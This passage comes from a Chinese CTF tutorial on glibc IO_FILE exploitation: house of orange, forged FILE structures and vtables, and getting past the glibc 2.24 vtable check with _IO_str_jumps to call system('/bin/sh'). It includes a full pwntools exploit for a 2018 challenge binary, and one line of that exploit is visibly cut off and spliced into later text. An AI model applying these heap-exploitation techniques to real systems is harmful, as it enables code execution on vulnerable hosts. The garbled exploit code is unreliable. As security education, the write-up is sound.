由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件只要满足其一就可以了。
之外，这段函数代码中也解释了为什么构造了0x61后，文件流会跳转的原因。
    _IO_flush_all_lockp (int do_lock)
    {
    [...]
      last_stamp = _IO_list_all_stamp;//第一个一定相等，所以跳转
      fp = (_IO_FILE *) _IO_list_all; 
      while (fp != NULL)
        {
    [...]
          if (((fp->_mode _IO_write_ptr > fp->_IO_write_base)//bypass或一条件
    #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                        > fp->_wide_data->_IO_write_base))//bypass或二条件
    #endif
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 自填充地址函数来劫持程序流
        [...]
          if (last_stamp != _IO_list_all_stamp)
        {
          fp = (_IO_FILE *) _IO_list_all;
          last_stamp = _IO_list_all_stamp;
        }
          else
        fp = fp->_chain;//指向下一个fp（从main_arena到heap）
        }
    [...]
    }
####  虚表函数的位置
首先，file结构的 *vtable 指针要填写伪造虚表的地址，这需要精确计算这也是为什么需要heap地址的原因。
其次，虚表的结构源码上文描述过，简单的做法就是，除了前两个填写0x0值外，其余都填写要想跳转的地址。
下面是一张完整的攻击流程图：
###  glibc2.24下的利用手段
> 在新版本的 glibc 中 (2.24)，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc
> 会在调用虚函数之前首先检查 vtable 地址的合法性。  
>  如果 vtable 是非法的，那么会引发 abort。  
>  首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。  
>  这里的检查使得以往使用 vtable 进行利用的技术很难实现
好，那我们先观察一下，新的check函数：
    static inline const struct _IO_jump_t *
    IO_validate_vtable (const struct _IO_jump_t *vtable)
    {
      uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
      const char *ptr = (const char *) vtable;
      uintptr_t offset = ptr - __start___libc_IO_vtables;
      if (__glibc_unlikely (offset >= section_length))
        _IO_vtable_check ();//引发报错的函数
      return vtable;
    }
由于 vtable 必须要满足 在 **stop_** libc_IO_vtables 和 **start_**
libc_IO_vtables之间，而我们上文伪造的vtable不满足这个条件。
然而攻击者找到了 **IO_str_jumps 和** IO_wstr_jumps 这两个结构体 可以绕过check。其中，因为利用
**IO_str_jumps 绕过更简单，本文着重介绍它，** IO_wstr_jumps与其大同小异。
观察
    const struct _IO_jump_t _IO_str_jumps libio_vtable =
    {
      JUMP_INIT_DUMMY,//调试发现占0x10
      JUMP_INIT(finish, _IO_str_finish),
      JUMP_INIT(overflow, _IO_str_overflow),
      JUMP_INIT(underflow, _IO_str_underflow),
      JUMP_INIT(uflow, _IO_default_uflow),
    [...]
    };
其中其中 _IO_str_finsh 和 _IO_str_overflow 可以拿来利用.相对来说，函数 _IO_str_finish
的绕过和利用条件更简单直接，该函数定义如下：
    void _IO_str_finish (FILE *fp, int dummy)
    {
      if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
        (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  //call qword ptr [fp+0E8h]
      fp->_IO_buf_base = NULL;
      _IO_default_finish (fp, 0);
    }
所以，在原来的基础上增加的是：
    fp->_flags = 0
    vtable = _IO_str_jumps - 0x8
    //这样调用_IO_overflow时会调用到 _IO_str_finish
    fp->_IO_buf_base = /bin/sh_addr
    fp+0xe8 = system_addr
同时，不用再伪造虚表，所以就可以不用泄露heap地址了。
而 _IO_str_overflow 会稍微复杂一些，该函数定义如下：
    int _IO_str_overflow (_IO_FILE *fp, int c)
    {
    [...]
        {
          if (fp->_flags & _IO_USER_BUF) // not allowed 
        return EOF;
          else
        {
          char *new_buf;
          char *old_buf = fp->_IO_buf_base;
          size_t old_blen = _IO_blen (fp);
          _IO_size_t new_size = 2 * old_blen + 100;                
          if (new_size _s._allocate_buffer) (new_size);
        [...]
    }
所以，它在原来的基础上增加的是：
    fp->_flags = 0
    fp->_IO_buf_base = 0
    fp->_IO_buf_end = (bin_sh_addr - 100) / 2
    fp->_IO_buf_base = /bin/sh_addr
    fp+0xe8 = system_addr
其实这份源码我读的时候，有个疑问：
fp->_s._free_buffer 和 fp->_s._allocate_buffer
到底是指向了偏移多少的地址，网上找到的一个答案说用IDA看，尴尬的是IDA里显示的是0xe0，这明显不对。还是简单点，动态调试一下就可以了。
    其实，_IO_vtable_check 函数也不会立刻报错，里面还会检查 dl_open_hook 等函数来检测是否是外来的文件流，从而取消报错，而这里又是一个可以利用的点。~~emmm再补这篇文章可能太冗长了，下次写~~
###  最后的一点注意
可以注意到，IO_file attack
的利用并不是百分百成功。凡事都有原因，我也想知道，但网上也搜索不到知识。最后感谢holing师傅，他帮我解决了这个疑问：
    必须要libc的低32位地址为负时，攻击才会成功。
噢，原来原因还是出在fflush函数的检查里，它第二步才是跳转，第一步的检查，在arena里的伪造file结构中这两个值，绝对值一定可以通过，那么就会直接执行虚表函数。所以只有为负时，才会check失效。再次感谢holing师傅。
最后，你会发现我虽然分了六步，但其实每一步都是紧紧相扣，如果到这里你已经忘了之前在讲什么，不妨看看下面这道pwn题，或许有新的体会。
## pwn题讲解
这里采用的安恒2018.10的level1题，网上好像也没有wp，我就心安理得地开始讲解。
凡事都从打开IDA开始
可以看出程序只有create函数和show函数，典型的要使用house of orange技术，再配上点IO_file attack技术。
观察show（）函数，发现printf函数有格式化漏洞，但是由于read函数输入时有截断，导致无法使用unsortedbin里的数据来泄露。偏移泄露时，观察到栈上只有libc里的地址，因只能泄露libc地址，考虑到使用2.24版本的攻击模式。
我使用house of orange技术时，直接抄取原本top_chunk的后三位。
数据填充完成后，可以发现gdb里已经对freed chunk无法识别。
接着申请新chunk报错时，观察数据变化和上文是否一致。
_IO_list_all
里储存的是main_arena+88的地址，而main_arena+88+0x18也储存着_IO_list_all-0x10的地址。
可以清楚观察到，arena里的伪造file结构的 *chain 确实指向了heap区伪造的chunk头。而它
的绝对值比较上，确实可以成功判断，从而有失败的可能。
回到heap区，发现部分数据已经改变，若是采用第二种办法，_wide_data 指向fp-0x10地址后，判断也能成功。
最后，当libc低32位小于0x80000000（为正）时，就会攻击失败。
最后放上exp：
    from pwn import *
    p = process('./level1')
    def create(size,stri):
        p.recvuntil('exitn')
        p.sendline('1')
        p.recvuntil('size: ')
        p.sendline(str(size))
        p.recvuntil('string: ')
        p.sendline(stri)
    def show():
        p.recvuntil('exitn')
        p.sendline('2')
        p.recvuntil('result: ')
        resp = p.recv(14)
        return resp
    create(0x10,'%2$p')
    libc = eval(show()[:14])-0x3c6780
    log.info('libc: '+hex(libc))
    sys = libc + 0x45390
    sh = libc + 0x18cd57
    one = libc + 0x45216
    _IO_list_all = libc + 0x3c5520
    #
    create(0x10,'%8$p.%p.%p.%p.%p.%p.%p')
    start = eval(show()[:14])-0x9b0
    log.info('start: '+hex(start))
    payload = 'a'*0x18+p64(0xfa1)
    create(0x10,payload)
    #gdb.attach(p)
    create(0x1000,'a')
    #unsortedbin
    pay='e'*0x100
    fake_file=p64(0)+p64(0x61) #fp ; to smallbin 0x60 (_chain)
    fake_file+=p64(libc)+p64(_IO_list_all-0x10) #unsortedbin attack
    fake_file+=p64(1)+p64(2) #_IO_write_base ; _IO_write_ptr
    fake_file+=p64(0)+p64(sh)#_IO_buf_base=sh_addr
    fake_file=fake_file.ljust(0xd8,'x00') #mode 来自 glibc 的 master 分支上的今年4月份的一次 commit，不出意外应该会出现在 libc-2.28 中。  
>  该方法简单粗暴，用操作堆的 malloc 和 free 替换掉原来在 _IO_str_fields 里的 _allocate_buffer  
>  和 _free_buffer。由于不再使用偏移，就不能再利用 __libc_IO_vtables 上的 vtable  
>  绕过检查，于是上面的利用技术就都失效了。
年关将至，现在正是今年的最后日子，刚刚掌握并整理了这份文档，我才发现开发者们已经比我快上近一年。而这种复杂又梦幻的攻击方法，在现实环境下却要用其他方法来辅助实现。但无论如何，通过这次学习，我学会了如何读源码，如何询问他人，成功总是要先学会失败。
## 参考资料
(1).
(2).